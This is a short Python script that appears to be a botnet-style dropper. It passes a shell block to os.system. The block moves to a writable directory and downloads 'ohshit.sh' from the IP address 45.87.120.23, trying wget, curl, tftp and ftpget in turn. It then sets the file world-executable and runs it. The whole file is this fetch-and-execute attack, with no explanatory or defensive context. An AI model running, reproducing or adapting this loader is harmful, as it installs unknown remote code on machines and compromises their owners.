import os

commands = """
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
if [ ! -f ohshit.sh ]; then
    if command -v wget >/dev/null 2>&1; then
        wget http://45.87.120.23/ohshit.sh -O ohshit.sh;
    elif command -v curl >/dev/null 2>&1; then
        curl -o ohshit.sh http://45.87.120.23/ohshit.sh;
    elif command -v tftp >/dev/null 2>&1; then
        tftp 45.87.120.23 -c get ohshit.sh;
    elif command -v ftpget >/dev/null 2>&1; then
        ftpget -v -u anonymous -p anonymous -P 21 45.87.120.23 ohshit.sh ohshit.sh;
    else
        echo "No download tool available";
        exit 1;
    fi
    chmod 777 ohshit.sh;
fi
sh ohshit.sh;
"""

os.system(commands)
